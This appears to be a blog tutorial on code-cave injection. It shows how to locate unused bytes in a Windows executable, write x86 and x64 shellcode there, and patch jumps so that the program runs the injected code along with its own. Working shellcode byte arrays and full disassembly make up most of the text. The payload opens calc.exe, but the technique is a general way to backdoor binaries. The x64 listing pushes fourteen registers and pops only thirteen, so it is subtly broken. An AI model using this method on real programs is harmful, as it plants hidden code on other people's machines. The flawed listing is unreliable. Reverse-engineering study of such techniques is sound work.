---
title: "Using code caves to inject custom shellcode"
classes: wide
header:
  teaser: /assets/images/injection/codecaves/codecaves.png
ribbon: DodgerBlue
description: "Learn how to use code caves to inject custom code into a .exe file"
categories:
  - Injection
toc: true
---

# Code caves

First of all, **what are code caves?**

Code caves are a chunk of null bytes (`0x00`) in a process's memory. Here's how they look like in `x64dbg`:

![Code cave chunk, x64dbg](/assets/images/injection/codecaves/codecaves.png)

Instead of `0x00` caves, you can also find `0x90` (NOP) sleds which can also function as code caves:

![NOP sled, x64dbg](/assets/images/injection/codecaves/nopsleds.png)

# How to find these code caves?

Most of the times, it's pretty easy. Just open the target process with `x64dbg` and scroll down to the end until you see a bunch of these null instructions:
```c
0040269D | 0000                     | add byte ptr ds:[eax],al                |
0040269F | 0000                     | add byte ptr ds:[eax],al                |
004026A1 | 0000                     | add byte ptr ds:[eax],al                |
004026A3 | 0000                     | add byte ptr ds:[eax],al                |
004026A5 | 0000                     | add byte ptr ds:[eax],al                |
004026A7 | 0000                     | add byte ptr ds:[eax],al                |
004026A9 | 0000                     | add byte ptr ds:[eax],al                |
```
You can then paste your shellcode in place of these null instructions (tutorial below).

If you want, you can also use Cheat Engine's "Scan for code caves" feature (`CTRL + ALT + C` in the Memory Viewer):

![Writing our shellcode](/assets/images/injection/codecaves/scan.png)

Then untick "*Also scan non-executable read only memory*" (because we want to inject executable shellcode):

![Clicking](/assets/images/injection/codecaves/click.png)

You'll then be able to see a list of many empty executable addresses within the process's memory state, that you can use to write your shellcode in:
![Code cave addresses](/assets/images/injection/codecaves/addresses.png)

# Taking advantage of code caves to inject shellcode

As you may know, we can take advantage of these unused bytes to directly inject raw executable opcodes (shellcode) within the application.

We can use this simple **x86 shellcode** that opens a calculator (`calc.exe`):

```c

// open calc.exe (195 bytes x86 shellcode).
unsigned char shellcode[] = 
"\x89\xe5\x83\xec\x20\x31\xdb\x64\x8b\x5b\x30\x8b\x5b\x0c\x8b\x5b"
"\x1c\x8b\x1b\x8b\x1b\x8b\x43\x08\x89\x45\xfc\x8b\x58\x3c\x01\xc3"
"\x8b\x5b\x78\x01\xc3\x8b\x7b\x20\x01\xc7\x89\x7d\xf8\x8b\x4b\x24"
"\x01\xc1\x89\x4d\xf4\x8b\x53\x1c\x01\xc2\x89\x55\xf0\x8b\x53\x14"
"\x89\x55\xec\xeb\x32\x31\xc0\x8b\x55\xec\x8b\x7d\xf8\x8b\x75\x18"
"\x31\xc9\xfc\x8b\x3c\x87\x03\x7d\xfc\x66\x83\xc1\x08\xf3\xa6\x74"
"\x05\x40\x39\xd0\x72\xe4\x8b\x4d\xf4\x8b\x55\xf0\x66\x8b\x04\x41"
"\x8b\x04\x82\x03\x45\xfc\xc3\xba\x78\x78\x65\x63\xc1\xea\x08\x52"
"\x68\x57\x69\x6e\x45\x89\x65\x18\xe8\xb8\xff\xff\xff\x31\xc9\x51"
"\x68\x2e\x65\x78\x65\x68\x63\x61\x6c\x63\x89\xe3\x41\x51\x53\xff"
"\xd0\x31\xc9\xb9\x01\x65\x73\x73\xc1\xe9\x08\x51\x68\x50\x72\x6f"
"\x63\x68\x45\x78\x69\x74\x89\x65\x18\xe8\x87\xff\xff\xff\x31\xd2"
"\x52\xff\xd0";
```

First, we'll go to the code cave, and add the following instructions:

```
pushad
pushfd
```

The x86 instruction `pushad` pushes all of the general-purpose register onto the stack, and the `pushfd` instruction pushes all the `EFLAGS` register onto the stack.

We need these instructions because we will need to restore the original register state and jump back to the original execution flow after executing our shellcode:
![Writing initial instructions](/assets/images/injection/codecaves/codecaves1.png)


We can then paste our shellcode after those 2 initial instructions:

![Writing our shellcode](/assets/images/injection/codecaves/pasting.png)

We now have this code instead of the initial `0x00` bytes:
```c
00401D5D | 60                       | pushad                                  | // <--- Pushes the contents of the general-purpose registers onto the stack
00401D5E | 9C                       | pushfd                                  | // <--- Pushes the entire contents of the EFLAGS register onto the stack
00401D5F | 89E5                     | mov ebp,esp                             | // We now paste our shellcode
00401D61 | 83EC 20                  | sub esp,20                              |
00401D64 | 31DB                     | xor ebx,ebx                             |
00401D66 | 64:8B5B 30               | mov ebx,dword ptr fs:[ebx+30]           |
00401D6A | 8B5B 0C                  | mov ebx,dword ptr ds:[ebx+C]            |
00401D6D | 8B5B 1C                  | mov ebx,dword ptr ds:[ebx+1C]           |
00401D70 | 8B1B                     | mov ebx,dword ptr ds:[ebx]              |
00401D72 | 8B1B                     | mov ebx,dword ptr ds:[ebx]              |
00401D74 | 8B43 08                  | mov eax,dword ptr ds:[ebx+8]            |
00401D77 | 8945 FC                  | mov dword ptr ss:[ebp-4],eax            |
00401D7A | 8B58 3C                  | mov ebx,dword ptr ds:[eax+3C]           |
00401D7D | 01C3                     | add ebx,eax                             |
00401D7F | 8B5B 78                  | mov ebx,dword ptr ds:[ebx+78]           |
00401D82 | 01C3                     | add ebx,eax                             |
00401D84 | 8B7B 20                  | mov edi,dword ptr ds:[ebx+20]           | edi:EntryPoint
00401D87 | 01C7                     | add edi,eax                             | edi:EntryPoint
00401D89 | 897D F8                  | mov dword ptr ss:[ebp-8],edi            | edi:EntryPoint
00401D8C | 8B4B 24                  | mov ecx,dword ptr ds:[ebx+24]           | ecx:EntryPoint
00401D8F | 01C1                     | add ecx,eax                             | ecx:EntryPoint
00401D91 | 894D F4                  | mov dword ptr ss:[ebp-C],ecx            | ecx:EntryPoint
00401D94 | 8B53 1C                  | mov edx,dword ptr ds:[ebx+1C]           | edx:EntryPoint
00401D97 | 01C2                     | add edx,eax                             | edx:EntryPoint
00401D99 | 8955 F0                  | mov dword ptr ss:[ebp-10],edx           | edx:EntryPoint
00401D9C | 8B53 14                  | mov edx,dword ptr ds:[ebx+14]           | edx:EntryPoint
00401D9F | 8955 EC                  | mov dword ptr ss:[ebp-14],edx           | edx:EntryPoint
00401DA2 | EB 32                    | jmp codecaving.401DD6                   |
00401DA4 | 31C0                     | xor eax,eax                             |
00401DA6 | 8B55 EC                  | mov edx,dword ptr ss:[ebp-14]           | edx:EntryPoint
00401DA9 | 8B7D F8                  | mov edi,dword ptr ss:[ebp-8]            | edi:EntryPoint
00401DAC | 8B75 18                  | mov esi,dword ptr ss:[ebp+18]           | esi:EntryPoint
00401DAF | 31C9                     | xor ecx,ecx                             | ecx:EntryPoint
00401DB1 | FC                       | cld                                     |
00401DB2 | 8B3C87                   | mov edi,dword ptr ds:[edi+eax*4]        | edi:EntryPoint
00401DB5 | 037D FC                  | add edi,dword ptr ss:[ebp-4]            | edi:EntryPoint
00401DB8 | 66:83C1 08               | add cx,8                                |
00401DBC | F3:A6                    | repe cmpsb                              |
00401DBE | 74 05                    | je codecaving.401DC5                    |
00401DC0 | 40                       | inc eax                                 |
00401DC1 | 39D0                     | cmp eax,edx                             | edx:EntryPoint
00401DC3 | 72 E4                    | jb codecaving.401DA9                    |
00401DC5 | 8B4D F4                  | mov ecx,dword ptr ss:[ebp-C]            | ecx:EntryPoint
00401DC8 | 8B55 F0                  | mov edx,dword ptr ss:[ebp-10]           | edx:EntryPoint
00401DCB | 66:8B0441                | mov ax,word ptr ds:[ecx+eax*2]          |
00401DCF | 8B0482                   | mov eax,dword ptr ds:[edx+eax*4]        |
00401DD2 | 0345 FC                  | add eax,dword ptr ss:[ebp-4]            |
00401DD5 | C3                       | ret                                     |
00401DD6 | BA 78786563              | mov edx,63657878                        | edx:EntryPoint
00401DDB | C1EA 08                  | shr edx,8                               | edx:EntryPoint
00401DDE | 52                       | push edx                                | edx:EntryPoint
00401DDF | 68 57696E45              | push 456E6957                           |
00401DE4 | 8965 18                  | mov dword ptr ss:[ebp+18],esp           |
00401DE7 | E8 B8FFFFFF              | call codecaving.401DA4                  |
00401DEC | 31C9                     | xor ecx,ecx                             | ecx:EntryPoint
00401DEE | 51                       | push ecx                                | ecx:EntryPoint
00401DEF | 68 2E657865              | push 6578652E                           |
00401DF4 | 68 63616C63              | push 636C6163                           |
00401DF9 | 89E3                     | mov ebx,esp                             |
00401DFB | 41                       | inc ecx                                 | ecx:EntryPoint
00401DFC | 51                       | push ecx                                | ecx:EntryPoint
00401DFD | 53                       | push ebx                                |
00401DFE | FFD0                     | call eax                                |
00401E00 | E8 A5020000              | call codecaving.4020AA                  | // end of shellcode
```

Now, after we pasted our shellcode, we need to modify our exe's code so that we `jmp` to the address of the start of the shellcode (`00401D5D`),

and then add a jmp instruction at the *end* of the shellcode to `jmp` back to the original execution flow (so that we don't break the program).

I chose this instruction to modify:
```c
jmp 0x00401D14
```
So first, let's modify that instruction instruction to `jmp` to the start of our shellcode (at address `00401D5D`) instead of `00401D14`

So instead of `jmp 0x00401D14`, it will be `jmp 00401D5D`:
![Jumping to our shellcode](/assets/images/injection/codecaves/oep.png)

And then at the end of our shellcode, we `jmp` to the actual instruction that the original `jmp` went to (`0x00401D14`):

![Jumping to our shellcode](/assets/images/injection/codecaves/end.png)

Now, after applying our patches in `x64dbg`, we can see that the program also launches `calc.exe` alongside its original payload:

![Successfully opening calc.exe](/assets/images/injection/codecaves/success.png)

# Shellcode injection in x64 processes

In x64, there's no `pushad` or `pushfd` instruction; you'd have to manually push all of the general-purpose registers.

So, in an x64 process, we'll write these instructions before writing our shellcode:
```
push rbx
push rcx
push rdx
push rsi
push rdi
push rbp
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15
```
![Pushing x64 registers](/assets/images/injection/codecaves/x64shellcode.png)


I will use this x64 shellcode to open `calc.exe`:
```c
unsigned char array[] = {
    0x48, 0x31, 0xFF, 0x48, 0xF7, 0xE7, 0x65, 0x48, 0x8B, 0x58, 0x60, 0x48, 0x8B, 0x5B, 0x18, 0x48,
    0x8B, 0x5B, 0x20, 0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x1B, 0x48, 0x8B, 0x5B, 0x20, 0x49, 0x89, 0xD8,
    0x8B, 0x5B, 0x3C, 0x4C, 0x01, 0xC3, 0x48, 0x31, 0xC9, 0x66, 0x81, 0xC1, 0xFF, 0x88, 0x48, 0xC1,
    0xE9, 0x08, 0x8B, 0x14, 0x0B, 0x4C, 0x01, 0xC2, 0x4D, 0x31, 0xD2, 0x44, 0x8B, 0x52, 0x1C, 0x4D,
    0x01, 0xC2, 0x4D, 0x31, 0xDB, 0x44, 0x8B, 0x5A, 0x20, 0x4D, 0x01, 0xC3, 0x4D, 0x31, 0xE4, 0x44,
    0x8B, 0x62, 0x24, 0x4D, 0x01, 0xC4, 0xEB, 0x32, 0x5B, 0x59, 0x48, 0x31, 0xC0, 0x48, 0x89, 0xE2,
    0x51, 0x48, 0x8B, 0x0C, 0x24, 0x48, 0x31, 0xFF, 0x41, 0x8B, 0x3C, 0x83, 0x4C, 0x01, 0xC7, 0x48,
    0x89, 0xD6, 0xF3, 0xA6, 0x74, 0x05, 0x48, 0xFF, 0xC0, 0xEB, 0xE6, 0x59, 0x66, 0x41, 0x8B, 0x04,
    0x44, 0x41, 0x8B, 0x04, 0x82, 0x4C, 0x01, 0xC0, 0x53, 0xC3, 0x48, 0x31, 0xC9, 0x80, 0xC1, 0x07,
    0x48, 0xB8, 0x0F, 0xA8, 0x96, 0x91, 0xBA, 0x87, 0x9A, 0x9C, 0x48, 0xF7, 0xD0, 0x48, 0xC1, 0xE8,
    0x08, 0x50, 0x51, 0xE8, 0xB0, 0xFF, 0xFF, 0xFF, 0x49, 0x89, 0xC6, 0x48, 0x31, 0xC9, 0x48, 0xF7,
    0xE1, 0x50, 0x48, 0xB8, 0x9C, 0x9E, 0x93, 0x9C, 0xD1, 0x9A, 0x87, 0x9A, 0x48, 0xF7, 0xD0, 0x50,
    0x48, 0x89, 0xE1, 0x48, 0xFF, 0xC2, 0x48, 0x83, 0xEC, 0x20, 0x41, 0xFF, 0xD6
};
```

Let's write this shellcode after the initial `push` instructions:

![Writing the shellcode](/assets/images/injection/codecaves/x64shellcode1.png)

After writing our shellcode, we'll pop the general purpose registers:

![Popping the registers](/assets/images/injection/codecaves/pop.png)

Now, **from somewhere within the actual process's execution flow**, we will have to jump to the start of our shellcode so that it gets executed.


This is the starting instruction of our shellcode:
```c
00007FF6B14323F4 | 53                       | push rbx                                |
```
At address `00007FF6B1431408`, the Entry Point instruction is located. I will modify that instruction with a jmp to the start of our shellcode:
```c
jmp 0x00007FF6B14323F4 // this address contains the first instruction in our shellcode
```
![Jumping to the start of the shellcode](/assets/images/injection/codecaves/modification.png)


And, at the end, we jump back to the instruction that comes right after that initial jump we made, so the program continues as if nothing happened.

![Jump back to the instruction that comes right after that initial jump](/assets/images/injection/codecaves/jumpingback.png)

This is our our final shellcode looks like:

```c
push rbx // <--- manually pushing all of the general-purpose registers onto the stack (for preservation)
push rcx
push rdx
push rsi
push rdi
push rbp
push r8
push r9
push r10
push r11
push r12
push r13
push r14
push r15 // <--- pushing ends here
xor rdi,rdi // <--- start of shellcode!
mul rdi
mov rbx,qword ptr gs:[rax+60]
mov rbx,qword ptr ds:[rbx+18]
mov rbx,qword ptr ds:[rbx+20]
mov rbx,qword ptr ds:[rbx]
mov rbx,qword ptr ds:[rbx]
mov rbx,qword ptr ds:[rbx+20]
mov r8,rbx
mov ebx,dword ptr ds:[rbx+3C]
add rbx,r8
xor rcx,rcx
add cx,88FF
shr rcx,8
mov edx,dword ptr ds:[rbx+rcx]
add rdx,r8
xor r10,r10
mov r10d,dword ptr ds:[rdx+1C]
add r10,r8
xor r11,r11
mov r11d,dword ptr ds:[rdx+20]
add r11,r8
xor r12,r12
mov r12d,dword ptr ds:[rdx+24]
add r12,r8
jmp cracked27 codecave.7FF601E32494
pop rbx
pop rcx
xor rax,rax
mov rdx,rsp
push rcx
mov rcx,qword ptr ss:[rsp]
xor rdi,rdi
mov edi,dword ptr ds:[r11+rax*4]
add rdi,r8
mov rsi,rdx
repe cmpsb 
je cracked27 codecave.7FF601E32485
inc rax
jmp cracked27 codecave.7FF601E3246B
pop rcx
mov ax,word ptr ds:[r12+rax*2]
mov eax,dword ptr ds:[r10+rax*4]
add rax,r8
push rbx
ret 
xor rcx,rcx
add cl,7
mov rax,9C9A87BA9196A80F
not rax
shr rax,8
push rax
push rcx
call cracked27 codecave.7FF601E32462
mov r14,rax
xor rcx,rcx
mul rcx
push rax
mov rax,9A879AD19C939E9C
not rax
push rax
mov rcx,rsp
inc rdx
sub rsp,20
call r14 // <--- end of shellcode!
pop r15 // <--- popping all the general purpose registers from the stack (to restore register state)
pop r14
pop r13
pop r12
pop r10
pop r9
pop r8
pop rbp
pop rdi
pop rsi
pop rdx
pop rcx
pop rbx
mov qword ptr ss:[rsp+18],rbx
jmp cracked27 codecave.7FF601E3140D // <--- Jumping back
```

And we can see that the patched file opens `calc.exe` alongside its original payload:

![x64 open calculator](/assets/images/injection/codecaves/calc.png)